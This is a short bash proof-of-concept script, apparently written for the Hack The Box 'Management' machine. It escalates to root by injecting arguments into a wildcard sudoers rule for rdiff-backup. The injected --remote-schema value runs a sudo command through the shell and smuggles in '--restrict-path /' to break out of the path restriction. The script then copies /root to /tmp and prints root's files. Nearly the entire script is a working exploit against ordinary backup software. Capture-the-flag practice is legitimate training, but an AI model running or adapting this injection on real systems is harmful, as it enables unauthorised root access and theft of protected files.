#!/bin/bash
# Management (HTB) privesc: rdiff-backup argument injection.
# Source write-up: management.txt
#
# Sudoers rule:
#   (root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup \
#     --restrict-mode read-only *
#
# --restrict-path is a single-value option (last wins) and "/" disables the jail.
# --remote-schema is executed with shell=True, so the sudo invocation lives inside it;
# %s is parked after a '#' so the substituted hostname becomes a shell comment.
#
# Usage (as owen):  ./poc_htb_management_rdiff.sh
set -u

SCHEMA='sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path / # %s'

echo "=== id ==="
id
echo "=== sudo -n -l ==="
sudo -n -l 2>&1 | tail -4

echo "=== cleaning old target ==="
rm -rf /tmp/rootbak

echo "=== pulling /root through the injected server ==="
rdiff-backup --remote-schema "$SCHEMA" backup h::/root /tmp/rootbak 2>&1 | tail -25
echo "rdiff-backup exit=$?"

echo "=== mirror listing ==="
ls -la /tmp/rootbak/ 2>&1 | head -30

echo "=== root.txt ==="
cat /tmp/rootbak/root.txt 2>&1

echo "=== done ==="
